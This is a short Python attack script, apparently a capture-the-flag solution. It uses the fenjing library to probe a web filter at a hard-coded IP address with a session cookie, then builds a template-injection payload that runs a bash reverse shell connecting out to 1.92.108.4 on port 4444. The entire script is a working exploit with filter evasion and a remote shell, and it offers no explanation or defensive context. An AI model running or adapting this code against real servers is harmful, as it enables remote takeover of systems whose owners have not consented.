import functools
import time
import requests
from fenjing import exec_cmd_payload

url = "http://101.200.138.180:16356/evlelLL/646979696775616e"
cookies = {
    'session': 'eyJhbnN3ZXJzX2NvcnJlY3QiOnRydWV9.ZlGuZA.w_q-j_eUwtkWT2yhwVOSthFohXE'
}

# headers = {
#     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0'
# }


@functools.lru_cache(1000)
def waf(payload: str):
    time.sleep(0.02)
    resp = requests.post(url, cookies=cookies, timeout=10, data={"iIsGod": payload})
    print(resp.text)
    print(payload)
    return "大胆" not in resp.text


if __name__ == "__main__":
    shell_payload, will_print = exec_cmd_payload(
        waf, 'bash -c "bash -i >& /dev/tcp/1.92.108.4/4444 0>&1"'
    )
    if not will_print:
        print("这个payload不会产生回显！")

    print(f"{shell_payload=}")
